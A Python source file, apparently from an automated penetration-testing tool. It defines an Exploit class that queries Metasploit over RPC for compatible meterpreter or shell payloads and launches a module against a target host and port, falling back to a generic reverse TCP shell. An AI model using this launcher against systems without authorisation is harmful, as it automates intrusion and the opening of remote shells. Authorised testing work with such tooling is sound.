import sys
sys.path.append('./')
from session import Session


class Exploit(object):
    def __init__(self, name, os, port, host):
        self.name = name
        self.os = os
        self.port = port
        self.host = host
        self.meterpreter = False
        self.shell = False
        self.meterpreter_payloads = []
        self.shell_payloads = []

    # TODO add singles !!!

    def add_meterpreter(self, client):
        """
        Add all available meterpreter payloads
        """
        payloads = client.call('module.compatible_payloads', self.name)[b'payloads'] 
        for payload in payloads:
            payload = str(payload)
            if 'meterpreter' in payload:
                self.meterpreter = True
                self.meterpreter_payloads.append(payload)
    
    def add_shell(self, client):
        """
        Add all available remote shell payloads
        """
        payloads = client.call('module.compatible_payloads', self.name)[b'payloads']
        for payload in payloads:
            payload = str(payload)
            if 'shell' in payload:
                self.shell = True
                self.shell_payloads.append(payload)

    def run(self, client):
        """
        Run exploit
        :param client: MSFRPClient
        :return: job id
        """
        if self.meterpreter:
            return client.call('module.execute', 'exploit', self.name, {'RHOST': self.host, 'RPORT': self.port, 'PAYLOAD': self.meterpreter_payloads[0]})[b'job_id']
        elif self.shell: 
            return client.call('module.execute', 'exploit', self.name, {'RHOST': self.host, 'RPORT': self.port, 'PAYLOAD': self.shell_payloads[1]})[b'job_id']
        else: 
            return client.call('module.execute', 'exploit', self.name, {'RHOST': self.host, 'RPORT': self.port, 'PAYLOAD': 'generic/shell_reverse_tcp'})[b'job_id']
        
    """
    def run(self, client, target, index=0):
    
        Run the exploit
        :param client: MSFRPC client
        :param target: target to exloit
        :param index:
        :return: Session or None
    
        client.console_execute('use {0}'.format(self.name))
        if client.meterpreter:
            client.console_execute('set PAYLOAD {0}'.format(client.meterpreter_payloads[0]))
            client.console_execute('hosts -S {0} -R'.format(target.ip))
            client.console_execute('run')
            results = str(client.console_execute('\n', True)[b'data'])
            results = results.split('\n')
            for result in results:
                if 'session' and 'opened' in result:
                    result = result.split(' ')
                    client.console_execute('back')
                    return Session(result[2], 'meterpreter')
                else:
                    return None
        elif client.shell:
            client.console_execute('set PAYLOAD {0}'.format(client.shell_payloads[0]))
            client.console_execute('hosts -S {0} -R'.format(target.ip))
            client.console_execute('run')
            results = str(client.console_execute('\n', True)[b'data'])
            results = results.split('\n')
            for result in results:
                if 'session' and 'opened' in result:
                    result = result.split(' ')
                    return Session(result[2], 'shell')
                else:
                    return None
    """ 
